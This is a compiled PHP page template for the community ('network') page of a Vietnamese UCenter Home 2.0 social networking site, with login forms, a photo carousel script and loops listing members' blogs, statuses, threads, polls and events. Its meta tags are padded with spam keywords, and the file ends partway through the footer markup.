<?php if(!defined('IN_UCHOME')) exit('Access Denied');?><?php subtplcheck('template/default/network|template/default/header|template/default/footer', '1315016458', 'template/default/network');?><?php $_TPL['nosidebar']=1; ?>
<?php if(empty($_SGLOBAL['inajax'])) { ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=<?=$_SC['charset']?>" />
<meta http-equiv="x-ua-compatible" content="ie=7" />
<title><?php if($_TPL['titles']) { ?><?php if(is_array($_TPL['titles'])) { foreach($_TPL['titles'] as $value) { ?><?php if($value) { ?><?=$value?> - <?php } ?><?php } } ?><?php } ?><?php if($_SN[$space['uid']]) { ?><?=$_SN[$space['uid']]?> - <?php } ?><?=$_SCONFIG['sitename']?> - Powered by UCenter Home 2.0 - Hỗ trợ GoHooH.CoM</title>
<meta name="keywords" content="Blog, Blogger, Mang xa hoi,Gohooh, gohooh.com, discuz, discuz viet, discuz viet nam, ho tro discuz, discuz free, discuz 7.0, ,free domain, free host, forum free, tao blog, tao dien dan, chia sẽ, hack rank, rank alexa, hack page rank, teen, teen news, tin nóng, thời sự, giải trí, tình bạn, tình yêu, thủ thuật blog, mã nguồn, share code, ảnh đẹp, bikini, girl xinh, kute girl, kool boy, kool girl, chat, teen girl, my tho, thanh pho my tho, discuz viet, ho tro discuz, domain free, host free, domain quoc te free, forum free, tao blog, mang xa hoi, goc rieng, kute girl, teen girl, hot girl, teen boy, hot boy, kool boy, anh dep, chia se, blog hay, code hay, tin nong, tin shock, tin sock, tin scandal,vip, pro, gai dep, anh hot, clip hay, free code, skin dep, skin discuz dep, tien giang, box, nhac hay, download,  x4 show, big bang,I love you - Duy Khánh, noi xau vo 2009, Buông Tay - Kyo , Buong tay, Khong tin 1 som mai binh yen - LIL KNIGHT, lut tu nga tu duong pho , thuy chi, anh khang, bao thy , M4u, con duong em mo, chiec khan gio am, khanh phuong, co tich tinh yeu, X4 number 1,vietnam, music, dien dan, forum, teen Viet, kenh truyen hinh, thoi trang, party, hinh anh, photo, stars, giai tri, thuy top, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips, thuytop. thuy top, bikini, cam tre em, 18+, viet nam, ddos, ho tro, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips Dien dan .music, rock, web, host, domain, freehost, free host, webmaster, free, thiet ke web, download, rapid, leech, rapidleech, megaupload, thủ thuật, chat, yahoo, it, hiphop, kute girl, film" />
<meta name="description" content="Blog, Blogger, Mang xa hoi,Gohooh, gohooh.com, discuz, discuz viet, discuz viet nam, ho tro discuz, discuz free, discuz 7.0, ,free domain, free host, forum free, tao blog, tao dien dan, chia sẽ, hack rank, rank alexa, hack page rank, teen, teen news, tin nóng, thời sự, giải trí, tình bạn, tình yêu, thủ thuật blog, mã nguồn, share code, ảnh đẹp, bikini, girl xinh, kute girl, kool boy, kool girl, chat, teen girl, my tho, thanh pho my tho, discuz viet, ho tro discuz, domain free, host free, domain quoc te free, forum free, tao blog, mang xa hoi, goc rieng, kute girl, teen girl, hot girl, teen boy, hot boy, kool boy, anh dep, chia se, blog hay, code hay, tin nong, tin shock, tin sock, tin scandal,vip, pro, gai dep, anh hot, clip hay, free code, skin dep, skin discuz dep, tien giang, box, nhac hay, download,  x4 show, big bang,I love you - Duy Khánh, noi xau vo 2009, Buông Tay - Kyo , Buong tay, Khong tin 1 som mai binh yen - LIL KNIGHT, lut tu nga tu duong pho , thuy chi, anh khang, bao thy , M4u, con duong em mo, chiec khan gio am, khanh phuong, co tich tinh yeu, X4 number 1,vietnam, music, dien dan, forum, teen Viet, kenh truyen hinh, thoi trang, party, hinh anh, photo, stars, giai tri, thuy top, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips, thuytop. thuy top, bikini, cam tre em, 18+, viet nam, ddos, ho tro, hot boy, hot girl, tin tuc, ngoi sao, scandal, sock, 9x, harajuku, emo, bikini, cool, kute, baby, trai xinh, gai dep, hot clips Dien dan .music, rock, web, host, domain, freehost, free host, webmaster, free, thiet ke web, download, rapid, leech, rapidleech, megaupload, thủ thuật, chat, yahoo, it, hiphop, kute girl, film" />
<meta http-equiv="EXPIRES" content="0" />
<meta name="RESOURCE-TYPE" content="DOCUMENT" />
<meta name="DISTRIBUTION" content="GLOBAL" />
<meta name="AUTHOR" content="Saokim999" />
<meta name="robots" content="index, follow" />
<meta name="revisit-after" content="1 days">
<script language="javascript" type="text/javascript" src="source/script_cookie.js"></script>
<script language="javascript" type="text/javascript" src="source/script_common.js"></script>
<script language="javascript" type="text/javascript" src="source/script_menu.js"></script>
<script language="javascript" type="text/javascript" src="source/script_ajax.js"></script>
<script language="javascript" type="text/javascript" src="source/script_face.js"></script>
<script language="javascript" type="text/javascript" src="source/script_manage.js"></script>
<script src="upmudim.js" type="text/javascript"></script>
<script src="http://www.google-analytics.com/urchin.js" type="text/javascript"></script>
<script type="text/javascript">
try {
_uacct = "UA-4097706-3";
urchinTracker();
} catch(err) {}</script>
<style type="text/css">
@import url(template/default/style.css);
<?php if($_TPL['css']) { ?>
@import url(template/default/<?=$_TPL['css']?>.css);
<?php } ?>
<?php if(!empty($_SGLOBAL['space_theme'])) { ?>
@import url(theme/<?=$_SGLOBAL['space_theme']?>/style.css);
<?php } elseif($_SCONFIG['template'] != 'default') { ?>
@import url(template/<?=$_SCONFIG['template']?>/style.css);
<?php } ?>
<?php if(!empty($_SGLOBAL['space_css'])) { ?>
<?=$_SGLOBAL['space_css']?>
<?php } ?>
</style>
<link rel="shortcut icon" href="image/favicon.ico" />
<link rel="edituri" type="application/rsd+xml" title="rsd" href="xmlrpc.php?rsd=<?=$space['uid']?>" />
</head>
<body>

<div id="append_parent"></div>
<div id="ajaxwaitid"></div>
<div id="header">
<?php if($_SGLOBAL['ad']['header']) { ?><div id="ad_header"><?php adshow('header'); ?></div><?php } ?>
<div class="headerwarp">
<h1 class="logo"><a href="http://gohooh.com"><img src="template/<?=$_SCONFIG['template']?>/image/logo.gif" alt="<?=$_SCONFIG['sitename']?>" /></a></h1>
<ul class="menu">
<?php if($_SGLOBAL['supe_uid']) { ?>
<li><a href="space.php?do=home">Trang chủ</a></li>
<li><a href="space.php">Trang cá nhân</a></li>
<li><a href="space.php?do=friend">Bạn bè</a></li>
<li><a href="network.php">Cộng đồng</a></li>
                <?php } else { ?>
<li><a href="index.php">Trang chính</a></li>
<?php } ?>

<?php if($_SGLOBAL['appmenu']) { ?>
<?php if($_SGLOBAL['appmenus']) { ?>
<li class="dropmenu" id="ucappmenu" onclick="showMenu(this.id)">
<a href="javascript:;">Site Menu</a>
</li>
<?php } else { ?>
<li><a target="_blank" href="<?=$_SGLOBAL['appmenu']['url']?>" title="<?=$_SGLOBAL['appmenu']['name']?>"><?=$_SGLOBAL['appmenu']['name']?></a></li>
<?php } ?>
<?php } ?>

<?php if($_SGLOBAL['supe_uid']) { ?>
<li><a href="space.php?do=pm<?php if(!empty($_SGLOBAL['member']['newpm'])) { ?>&filter=newpm<?php } ?>">Tin nhắn<?php if(!empty($_SGLOBAL['member']['newpm'])) { ?>(Mới)<?php } ?></a></li>
<?php if($_SGLOBAL['member']['allnotenum']) { ?><li class="notify" id="membernotemenu" onmouseover="showMenu(this.id)"><a href="space.php?do=notice"><?=$_SGLOBAL['member']['allnotenum']?>Một thông điệp</a></li><?php } ?>
<?php } else { ?>
<li><a href="help.php">Trợ giúp</a></li>
<?php } ?>
</ul>

<div class="nav_account">
<?php if($_SGLOBAL['supe_uid']) { ?>
<a href="space.php?uid=<?=$_SGLOBAL['supe_uid']?>" class="login_thumb"><?php echo avatar($_SGLOBAL[supe_uid]); ?></a>
<a href="space.php?uid=<?=$_SGLOBAL['supe_uid']?>" class="loginName"><?=$_SN[$_SGLOBAL['supe_uid']]?></a>
<?php if($_SGLOBAL['member']['credit']) { ?>
<a href="cp.php?ac=credit" style="font-size:11px;padding:0 0 0 5px;"><img src="image/credit.gif"><?=$_SGLOBAL['member']['credit']?></a>
<?php } ?>
<br />
<?php if(empty($_SCONFIG['closeinvite'])) { ?>
<a href="cp.php?ac=invite">Mời</a> 
<?php } ?>
<a href="cp.php?ac=task">Task</a> 
<a href="cp.php?ac=magic">Thẻ Vip</a>
<a href="cp.php">CP</a> 
<a href="cp.php?ac=common&op=logout&uhash=<?=$_SGLOBAL['uhash']?>">Thoát</a>
<?php } else { ?>
<a href="do.php?ac=<?=$_SCONFIG['register_action']?>" class="login_thumb"><?php echo avatar($_SGLOBAL[supe_uid]); ?></a>
Welcome<br>
<a href="do.php?ac=<?=$_SCONFIG['login_action']?>">Đăng nhập</a> | 
<a href="do.php?ac=<?=$_SCONFIG['register_action']?>">Đăng ký</a>
<?php } ?>
</div>
</div>
</div>

<div id="wrap">

<?php if(empty($_TPL['nosidebar'])) { ?>
<div id="main">
<div id="app_sidebar">
<?php if($_SGLOBAL['supe_uid']) { ?>
<ul class="app_list" id="default_userapp">
<li><img src="image/app/doing.gif"><a href="space.php?do=doing">Status</a></li>
<li><img src="image/app/album.gif"><a href="space.php?do=album">Album</a><em><a href="cp.php?ac=upload" class="gray">Upload</a></em></li>
<li><img src="image/app/blog.gif"><a href="space.php?do=blog">Blogs</a><em><a href="cp.php?ac=blog" class="gray">Viết</a></em></li>
<li><img src="image/app/poll.gif"/><a href="space.php?do=poll">Poll</a><em><a href="cp.php?ac=poll" class="gray">Bình chọn</a></em></li>
<li><img src="image/app/mtag.gif"><a href="space.php?do=mtag">Group</a><em><a href="cp.php?ac=thread" class="gray">Tạo</a></em></li>
<li><img src="image/app/event.gif"/><a href="space.php?do=event">Event</a><em><a href="cp.php?ac=event" class="gray">Bắt đầu</a></em></li>
<li><img src="image/app/share.gif"><a href="space.php?do=share">Share</a></li>
<li><img src="image/app/topic.gif"><a href="space.php?do=topic">Topic</a></li>
<li><img src="image/app/farm.gif"><a href="qqfarm.php">Nông trại</a></li>
<li><img src="image/app/fish.gif"><a href="fish.php">Ao cá</a></li>
<li><img src="image/app/love.gif"><a href="house.php">Hạnh phúc</a></li>
<li><img src="image/app/clxj.gif"><a href="clxj.php">Audition</a></li>
<li><img src="image/app/thinhthay.jpg"><a href="thayboi.php">Thầy bói</a></li>
<li><img src="image/app/blq.gif"><a href="blq.php">Bowling</a></li>
<li><img src="image/app/daovang.gif"><a href="daovang.php">Đào vàng</a></li>
<li><img src="image/app/gohoohhungtrung.gif"><a href="gohoohhungtrung.php">Hứng trứng</a></li>
<li><img src="image/app/duluong.gif"><a href="duluong.php">Dù lượng</a></li>
<li><img src="image/app/dapthu.gif"><a href="dapthu.php">Đập thú</a></li>
<li><img src="image/app/bangau.gif"><a href="bangau.php">Trượt tuyết</a></li>
<li><img src="image/app/xeptraicay.gif"><a href="xeptraicay.php">Xếp trái cây</a></li>
<li><img src="image/app/thamhiem.gif"><a href="thamhiem.php">Thám hiểm</a></li>
</ul>

<ul class="app_list topline" id="my_defaultapp">
<?php if($_SCONFIG['my_status']) { ?>
<?php if(is_array($_SGLOBAL['userapp'])) { foreach($_SGLOBAL['userapp'] as $value) { ?>
<li><img src="http://appicon.manyou.com/icons/<?=$value['appid']?>"><a href="userapp.php?id=<?=$value['appid']?>"><?=$value['appname']?></a></li>
<?php } } ?>
<?php } ?>
</ul>

<?php if($_SCONFIG['my_status']) { ?>
<ul class="app_list topline" id="my_userapp">
<?php if(is_array($_SGLOBAL['my_menu'])) { foreach($_SGLOBAL['my_menu'] as $value) { ?>
<li id="userapp_li_<?=$value['appid']?>"><img src="http://appicon.manyou.com/icons/<?=$value['appid']?>"><a href="userapp.php?id=<?=$value['appid']?>" title="<?=$value['appname']?>"><?=$value['appname']?></a></li>
<?php } } ?>
</ul>
<?php } ?>

<?php if($_SGLOBAL['my_menu_more']) { ?>
<p class="app_more"><a href="javascript:;" id="a_app_more" onclick="userapp_open();" class="off">Mở rộng</a></p>
<?php } ?>

<?php if($_SCONFIG['my_status']) { ?>
<div class="app_m">
<ul>
<li><img src="image/app_add.gif"><a href="cp.php?ac=userapp&my_suffix=%2Fapp%2Flist" class="addApp">Thêm ứng dụng</a></li>
<li><img src="image/app_set.gif"><a href="cp.php?ac=userapp&op=menu" class="myApp">Quản lý Apps</a></li>
</ul>
</div>
<?php } ?>

<?php } else { ?>
<div class="bar_text">
<form id="loginform" name="loginform" action="do.php?ac=<?=$_SCONFIG['login_action']?>&ref" method="post">
<input type="hidden" name="formhash" value="<?php echo formhash(); ?>" />
<p class="title">Đăng nhập Web</p>
<p>User name</p>
<p><input type="text" name="username" id="username" class="t_input" size="15" value="" /></p>
<p>Password</p>
<p><input type="password" name="password" id="password" class="t_input" size="15" value="" /></p>
<p><input type="checkbox" id="cookietime" name="cookietime" value="315360000" checked /><label for="cookietime">Nhớ mật khẩu</label></p>
<p>
<input type="submit" id="loginsubmit" name="loginsubmit" value="Đăng nhập" class="submit" />
<input type="button" name="regbutton" value="Đăng ký" class="button" onclick="urlto('do.php?ac=<?=$_SCONFIG['register_action']?>');">
</p>
</form>
</div>
<?php } ?>
</div>

<div id="mainarea">

<?php if($_SGLOBAL['ad']['contenttop']) { ?><div id="ad_contenttop"><?php adshow('contenttop'); ?></div><?php } ?>
<?php } ?>

<?php } ?>

<!--Translated by Saokim999 & kienngohik, Vào www.traitimyenbai.net Để cập nhập lang việt, tem và ứng dụng.-->
<div id="network">

<script>
function setintro(type) {
var intro = '';
var bPosition = '';
if(type == 'doing') {
intro = 'Ghi lại trạng thái, cảm xúc, hành động trong cuộc sống';
bPosition = '0';
} else if(type == 'mtag') {
intro = 'Tạo và tham gia Nhóm, viết những chủ đề thảo luận mà bạn bè quan tâm';
bPosition = '175px';
} else if(type == 'pic') {
intro = 'Tải ảnh lên, chia sẻ ảnh đẹp và khoảnh khắc cuộc sống';
bPosition = '55px';
} else if(type == 'app') {
intro = 'Cùng bạn bè tham gia các trò chơi thú vị';
bPosition = '118px';
} else {
intro = 'Đăng ký tham gia để kết bạn, viết blog, chia sẻ ảnh và chơi game...';
bPosition = '0';
}
$('guest_intro').innerHTML = intro + '......';
$('guest_intro').style.backgroundPosition = bPosition + ' 100%'
}
function scrollPic(e, LN, Width, Price, Speed) {
id = e.id;
if(LN == 'Last'){ scrollNum = Width; } else if(LN == 'Next'){ scrollNum = 0 - Width; }
scrollStart = parseInt(e.style.marginLeft, 10);
scrollEnd = parseInt(e.style.marginLeft, 10) + scrollNum;

MaxIndex = (e.getElementsByTagName('li').length / Price).toFixed(0);
sPicMaxScroll = 0 - Width * MaxIndex;

if(scrollStart == 0 && scrollEnd == Width){
scrollEnd = -1806;
e.style.marginLeft = parseInt(e.style.marginLeft, 10) - Speed + 'px';
} else if(scrollStart == sPicMaxScroll + Width && scrollEnd == sPicMaxScroll){
scrollEnd = 0;
e.style.marginLeft = parseInt(e.style.marginLeft, 10) + Speed + 'px';
}
scrollShowPic = setInterval(scrollShow, 1);

function scrollShow() {
if(scrollStart > scrollEnd) {
if(parseInt(e.style.marginLeft, 10) > scrollEnd) {
$(id + '_last').onclick = function(){ return false; };
$(id + '_next').onclick = function(){ return false; };
e.style.marginLeft = parseInt(e.style.marginLeft, 10) - Speed + 'px';
} else {
clearInterval(scrollShowPic);
$(id + '_last').onclick = function(){ scrollPic(e, 'Last', Width, Price, Speed);return false; };
$(id + '_next').onclick = function(){ scrollPic(e, 'Next', Width, Price, Speed);return false; };
}
} else {
if(parseInt(e.style.marginLeft, 10) < scrollEnd) {
$(id + '_last').onclick = function(){ return false; };
$(id + '_next').onclick = function(){ return false; };
e.style.marginLeft = parseInt(e.style.marginLeft, 10) + Speed + 'px';
} else {
clearInterval(scrollShowPic);
$(id + '_last').onclick = function(){ scrollPic(e, 'Last', Width, Price, Speed);return false; };
$(id + '_next').onclick = function(){ scrollPic(e, 'Next', Width, Price, Speed);return false; };
}					
}
}
}
function scrollShowNav(e, Width, Price, Speed) {
id = e.id;
$(id + '_last').onclick = function(){ scrollPic(e, 'Last', Width, Price, Speed);return false; };
$(id + '_next').onclick = function(){ scrollPic(e, 'Next', Width, Price, Speed);return false; };

}
function getUserTip(obj) {
var tipBox = $('usertip_box');
tipBox.childNodes[0].innerHTML = '<strong>' + obj.rel + ':<\/strong> ' + obj.rev + '...';

var showLeft;
if(obj.parentNode.offsetLeft > 730) {
showLeft = $('showuser').offsetLeft + obj.parentNode.offsetLeft - 148;
tipBox.childNodes[0].style.right = 0;
} else {
tipBox.childNodes[0].style.right = 'auto';
showLeft = $('showuser').offsetLeft + obj.parentNode.offsetLeft;
}
tipBox.style.left = showLeft + 'px';

var showTop; 
if(obj.className == 'uonline') {
showTop = $('showuser').offsetTop + obj.parentNode.offsetTop - tipBox.childNodes[0].clientHeight;
} else {
showTop = $('showuser').offsetTop + obj.parentNode.offsetTop + 48;
}
tipBox.style.top = showTop + 'px';

tipBox.style.visibility = 'visible';
}
</script>

<?php if(empty($_SGLOBAL['supe_uid'])) { ?>
<div id="guestbar" class="nbox">
<div class="nbox_c">
<p id="guest_intro">Mời bạn tham gia để kết bạn, chia sẻ ảnh, blog, tham gia nhóm và chơi các game thú vị......</p>
<a href="do.php?ac=<?=$_SCONFIG['register_action']?>" id="regbutton" onmouseover="setintro('register');">Đăng ký</a>
<p id="guest_app">
<a href="javascript:;" class="appdoing" onmouseover="setintro('doing');">Status</a>
<a href="javascript:;" class="appphotos" onmouseover="setintro('pic');">Hình ảnh</a>
<a href="javascript:;" class="appgames" onmouseover="setintro('app');">Ứng dụng</a>
<a href="javascript:;" class="appgroups" onmouseover="setintro('mtag');">Nhóm</a> 
</p>
</div>	
<div class="nbox_s side_rbox" id="nlogin_box">
<h3 class="ntitle">Đăng nhập hoặc đăng ký</h3>
<div class="side_rbox_c">
<form name="loginform" action="do.php?ac=<?=$_SCONFIG['login_action']?>&<?=$url_plus?>&ref" method="post">
<p><label for="username">User</label> <input type="text" name="username" id="username" class="t_input" value="<?=$membername?>" /></p>
<p><label for="password">Pass</label> <input type="password" name="password" id="password" class="t_input" value="<?=$password?>" /></p>
<p class="checkrow"><input type="checkbox" id="cookietime" name="cookietime" value="315360000" <?=$cookiecheck?> style="margin-bottom: -2px;" /><label for="cookietime">Nhớ mật khẩu</label></p>
<p class="submitrow">
<input type="hidden" name="refer" value="space.php?do=home" />
<input type="submit" id="loginsubmit" name="loginsubmit" value="Login" class="submit" />
<a href="do.php?ac=lostpasswd">Quên mã?</a>
<input type="hidden" name="formhash" value="<?php echo formhash(); ?>"
</p>
</form>
</div>
</div>
</div>
<?php } ?>

<div class="nbox">
<div class="nbox_c">
<h2 class="ntitle"><span class="r_option"><a href="space.php?do=blog&view=all">Xem tất cả Blogs</a></span> Blog thành viên &raquo;</h2>
<ul class="bloglist">
<?php if(is_array($bloglist)) { foreach($bloglist as $key => $value) { ?>
<li <?php if($key%2==1) { ?>class="list_r"<?php } ?>>
<h3><a href="space.php?uid=<?=$value['uid']?>&do=blog&id=<?=$value['blogid']?>" target="_blank"><?=$value['subject']?></a></h3>
<div class="d_avatar avatar48"><a href="space.php?uid=<?=$value['uid']?>" title="<?=$_SN[$value['uid']]?>" target="_blank"><?php echo avatar($value[uid],small); ?></a></div>
<p class="message"><?=$value['message']?> ...</p>
<p class="nhot"><a href="space.php?uid=<?=$value['uid']?>&do=blog&id=<?=$value['blogid']?>">Độ Hot: <?=$value['hot']?></a></p>
<p class="gray"><a href="space.php?uid=<?=$value['uid']?>"><?=$_SN[$value['uid']]?></a> Trên <?php echo sgmdate('m-d H:i',$value[dateline],1); ?></p>
</li>
<?php } } ?>
</ul>
</div>
<div class="nbox_s side_rbox side_rbox_w">
<h2 class="ntitle"><span class="r_option"><a href="space.php?do=doing&view=all">Xem tất cả trạng thái</a></span> Status &raquo;</h2>
<div class="side_rbox_c">
<ul class="side_rbox_c doinglist">
<?php if(is_array($dolist)) { foreach($dolist as $value) { ?>
<li>
<p>
<a href="space.php?uid=<?=$value['uid']?>&do=doing&doid=<?=$value['doid']?>" target="_blank" class="gray r_option dot" style="margin:0;background-position-y: 0;"><?php echo sgmdate('H:i',$value[dateline],1); ?></a>
<a href="space.php?uid=<?=$value['uid']?>" title="<?=$_SN[$value['uid']]?>" class="s_avatar"><?php echo avatar($value[uid],small); ?></a>
<a href="space.php?uid=<?=$value['uid']?>"><?=$_SN[$value['uid']]?></a>
</p>
<p class="message" title="<?=$value['title']?>"><?=$value['message']?></p>
</li>
<?php } } ?>
</ul>
</div>
</div>
</div>



<div class="nbox" id="photolist">
<h2 class="ntitle">
<a href="space.php?do=album&view=all" class="r_option">Xem thêm ảnh</a>
Album ảnh thành viên &raquo;
</h2>
<div id="p_control">
<a href="javascript:;" id="spics_last">Trước</a>
<a href="javascript:;" id="spics_next">Sau</a>
<ul id="p_control_pages">
<li>Đầu tiên</li>
<li>Trang hai</li>
<li>Trang ba</li>
<li>Trang bốn</li>
</li>
</div>
<div id="spics_wrap">
<ul id="spics" style="margin-left: 0;">
<?php if(is_array($piclist)) { foreach($piclist as $key => $value) { ?>
<li class="spic_<?=$key?>">
<div class="spic_img"><a href="space.php?uid=<?=$value['uid']?>&do=album&picid=<?=$value['picid']?>" target="_blank"><strong><?=$value['hot']?></strong><img src="<?=$value['pic']?>" alt="<?=$value['albumname']?>" /></a></div>
<p><a href="space.php?uid=<?=$value['uid']?>"><?=$_SN[$value['uid']]?></a></p>
<p><?php echo sgmdate('m-d H:i',$value[dateline],1); ?></p>
</li>
<?php } } ?>
</ul>
</div>
</div>
<script type="text/javascript">
scrollShowNav($('spics'), 903, 7, 43);
</script>

<div id="searchbar" class="nbox s_clear">
<div class="floatleft">
<form method="get" action="cp.php">
<input name="searchkey" value="" size="15" class="t_input" type="text" style="padding:5px;">
<input name="searchsubmit" value="Tìm bạn bè" class="submit" type="submit"> &nbsp;
Tìm: <a href="cp.php?ac=friend&op=search&view=sex" target="_blank">Nam và Nữ</a><span class="pipe">|</span>
<a href="cp.php?ac=friend&op=search&view=reside" target="_blank">Không xác định</a><span class="pipe">|</span>
<a href="cp.php?ac=friend&op=search&view=birth" target="_blank">Nơi sinh</a><span class="pipe">|</span>
<a href="cp.php?ac=friend&op=search&view=birthyear" target="_blank">Ngày, tháng năm sinh</a><span class="pipe">|</span>
<a href="cp.php?ac=friend&op=search&view=edu" target="_blank">Sinh viên</a><span class="pipe">|</span>
<a href="cp.php?ac=friend&op=search&view=work" target="_blank">Đồng nghiệp</a><span class="pipe">|</span>
<a href="space.php?do=top&view=online" target="_blank">Member Online(<?=$olcount?>)</a>
<input type="hidden" name="searchmode" value="1" />
<input type="hidden" name="ac" value="friend" />
<input type="hidden" name="op" value="search" />
</form>
</div>
<div class="floatright">
<form method="get" action="space.php">
<input name="searchkey" value="" size="15" class="t_input" type="text" style="padding:5px;">
<select name="do">
<option value="blog">Blog</option>
<option value="album">Album</option>
<option value="thread">Topic</option>
<option value="poll">Vote</option>
<option value="event">Event</option>
</select>
<input name="searchsubmit" value="Tìm kiếm" class="submit" type="submit">
<input type="hidden" name="view" value="all" />
<input type="hidden" name="orderby" value="dateline" />
</form>
</div>
</div>

<div id="showuser" class="nbox">
<div id="user_recomm">
<h2>Website gia đình</h2>
<?php if(is_array($star)) { foreach($star as $value) { ?>
<div class="s_avatar"><a href="space.php?uid=<?=$value['uid']?>" target="_blank"><?php echo avatar($value[uid],middle); ?></a></div>
<div class="s_cnts">
<h3><a href="space.php?uid=<?=$value['uid']?>" title="<?=$_SN[$value['uid']]?>"><?=$_SN[$value['uid']]?></a></h3>
<p>Truy cập:<?=$value['viewnum']?></p>
<p>Điểm:<?=$value['credit']?></p>
<hr />
<p>Bạn bè:<?=$value['friendnum']?></p>
<p>Cập nhập:<?php echo sgmdate('H:i',$value[updatetime],1); ?></p>
</div>
<?php } } ?>
</div>
<div id="user_wall" onmouseout="javascript:$('usertip_box').style.visibility = 'hidden';">
<div id="user_pay" class="s_clear">
<h2><a href="space.php?do=top">Đặt giá để xếp hạng</a></h2>
<ul>
<?php if(is_array($showlist)) { foreach($showlist as $value) { ?>
<li><a href="space.php?uid=<?=$value['uid']?>" target="_blank" rel="<?=$_SN[$value['uid']]?>" rev="<?=$value['note']?>" onmouseover="getUserTip(this)"><?php echo avatar($value[uid],small); ?></a></li>
<?php } } ?>
</ul>
<p><a href="space.php?do=top">Xem biểu đồ thống kê</a></p>
</div>
<div id="user_online" class="s_clear">
<h2><a href="space.php?do=top&view=online">Thành viên trực tuyến</a></h2>
<ul>
<?php if(is_array($onlinelist)) { foreach($onlinelist as $value) { ?>
<li><a href="space.php?uid=<?=$value['uid']?>" target="_blank" rel="<?=$_SN[$value['uid']]?>" rev="<?=$value['note']?>" class="uonline" onmouseover="getUserTip(this)"><?php echo avatar($value[uid],small); ?></a></li>
<?php } } ?>
</ul>
</div>
</div>
</div>
<div id="usertip_box"><div></div></div>

<div class="nbox">
<div class="nbox_c">
<h2 class="ntitle"><span class="r_option"><a href="space.php?do=thread&view=all">Xem thêm chủ đề khác</a></span>Thảo luận Nhóm &raquo;</h2>
<div class="tlist">
<table cellpadding="0" cellspacing="1">
<tbody>
<?php if(is_array($threadlist)) { foreach($threadlist as $key => $value) { ?>
<tr <?php if($key%2==1) { ?>class="color_row"<?php } ?>>
<td class="ttopic"><div class="ttop"><div><span><?=$value['hot']?></span></div></div><a href="space.php?uid=<?=$value['uid']?>&do=thread&id=<?=$value['tid']?>" target="_blank"><?=$value['subject']?></a></td>
<td class="tuser"><a href="space.php?uid=<?=$value['uid']?>" target="_blank"><?php echo avatar($value[uid],small); ?></a> <a href="space.php?uid=<?=$value['uid']?>" target="_blank"><?=$_SN[$value['uid']]?></a></td>
<td class="tgp"><a href="space.php?do=mtag&tagid=<?=$value['tagid']?>"><?=$value['tagname']?></a></td>
</tr>
<?php } } ?>
</tbody>
</table>
</div>
</div>
<div id="npoll" class="nbox_s side_rbox side_rbox_w">
<div class="side_rbox_c">
<h2 class="ntitle"><span class="r_option"><a href="space.php?do=poll">Xem thêm bình chọn</a></span>Vote &raquo;</h2>
<ul>
<?php if(is_array($polllist)) { foreach($polllist as $key => $value) { ?>
<li class="poll_<?=$key?>"><a href="space.php?uid=<?=$value['uid']?>&do=poll&pid=<?=$value['pid']?>" target="_blank"><?=$value['subject']?></a><?php if($key == 0) { ?><p><a href="">Có <?=$value['voternum']?> thành viên bình chọn</a></p><?php } ?></li>
<?php } } ?>
</ul>
</div>
</div>
</div>

<?php if($myappcount) { ?>
<div class="nbox">
<div class="nbox_c" style="border: none;">
<ul class="applist">
<?php if(is_array($myapplist)) { foreach($myapplist as $value) { ?>
<li>
<p class="aimg"><a href="userapp.php?id=<?=$value['appid']?>" target="_blank"><img src="http://appicon.manyou.com/logos/<?=$value['appid']?>" alt="<?=$value['appname']?>" /></a></p>
<p><a href="userapp.php?id=<?=$value['appid']?>" target="_blank"><?=$value['appname']?></a></p>
</li>
<?php } } ?>
</ul>
</div>
<div class="susb">
<div class="ye_r_t"><div class="ye_l_t"><div class="ye_r_b"><div class="ye_l_b">
<div class="appmo">
<p>Tổng cộng <span><?=$myappcount?></span> Ứng dụng</p>
<p class="appmobutton"><a href="cp.php?ac=userapp&my_suffix=%2Fapp%2Flist">Xem các ứng dụng khác</a></p>
</div>
</div></div></div></div>	
</div>
</div>
<?php } ?>

<div class="nbox">
<div class="nbox_c">
<h2 class="ntitle"><span class="r_option"><a href="space.php?do=event&view=recommend">Xem sự kiện khác</a></span> Hoạt động &raquo; 
<?php if(is_array($_SGLOBAL['eventclass'])) { foreach($_SGLOBAL['eventclass'] as $value) { ?>
&nbsp; <a href="space.php?do=event&view=all&type=going&classid=<?=$value['classid']?>"><?=$value['classname']?></a></li>
<?php } } ?>
</h2>
<ul class="elist">
<?php if(is_array($eventlist)) { foreach($eventlist as $value) { ?>
<li>
<h3><a href="space.php?do=event&id=<?=$value['eventid']?>" target="_blank"><?=$value['title']?></a></h3>
<p class="eimage"><a href="space.php?do=event&id=<?=$value['eventid']?>" target="_blank"><img src="<?=$value['pic']?>" alt=""/></a></p>
<p><span class="gray">Thời gian:</span> <?php echo sgmdate('n-j H:i',$value[starttime]); ?> - <?php echo sgmdate('n-j H:i',$value[endtime]); ?></p>
<p><span class="gray">Địa điểm:</span> <?=$value['province']?> <?=$value['city']?> <?=$value['location']?></p>
<p><span class="gray">Khởi xướng:</span> <a href="space.php?uid=<?=$value['uid']?>"><?=$_SN[$value['uid']]?></a></p>
<p class="egz"><?=$value['membernum']?> thành viên tham gia<span class="pipe">|</span><?=$value['follownum']?> từ chối</p>
</li>
<?php } } ?>
</ul>
</div>
<div id="nshare" class="nbox_s side_rbox side_rbox_w">
<h2 class="ntitle"><span class="r_option"><a href="space.php?do=share&view=all">Xem tất cả các Chia sẻ</a></span>Share &raquo;</h2>
<div class="side_rbox_c">
<ul>
<?php if(is_array($sharelist)) { foreach($sharelist as $value) { ?>
<li><a href="space.php?uid=<?=$value['uid']?>"><?=$_SN[$value['uid']]?></a> <em><a href="space.php?uid=<?=$value['uid']?>&do=share&view=me"><?=$value['title_template']?></a></em></li>
<?php } } ?>
</ul>
</div>
</div>
</div>

<div class="footerbar">
<div class="fbtop"></div>
<div class="nbox_c">
<div class="foobox">
<div class="fbox">
<h2 class="ntitle">Mạng xã hội</h2>
<ul>
<li><a href="space.php?do=doing">Status</a></li>
<li><a href="space.php?do=blog">Blogs</a></li>
